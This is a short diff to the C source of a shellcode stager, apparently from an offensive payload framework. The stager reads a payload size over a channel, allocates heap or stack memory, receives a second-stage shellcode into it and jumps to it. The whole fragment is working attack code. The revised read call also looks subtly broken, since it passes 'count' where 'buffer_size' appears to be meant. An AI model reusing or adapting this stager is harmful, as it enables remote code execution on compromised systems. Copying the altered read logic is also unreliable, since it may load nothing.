@@ -24,15 +24,16 @@ SHELLCODE_ENTRY {
     _Static_assert(MEMORY == MMAP || MEMORY == STACK, "Must set MEMORY parameter to STACK or MMAP.");
 
     /* Read the size of the input buffer (2 bytes). */
-    _read(chan.rx, &buffer_size, sizeof(buffer_size));
+    channel_recv(chan, &buffer_size, sizeof(buffer_size));
     if ( MEMORY == MMAP )
         memory = (unsigned char *) _malloc(buffer_size);
     else
         memory = get_sp() + 0x100;
 
-    while ( count < buffer_size && _read(chan.rx, memory+count, 1) >= 0 )
-        count++;
+    /* Read shellcode in memory. */
+    channel_recv(chan, memory, count);
 
+    /* Execute shellcode. */
     ((shellcode) memory)();
 
 } SHELLCODE_END
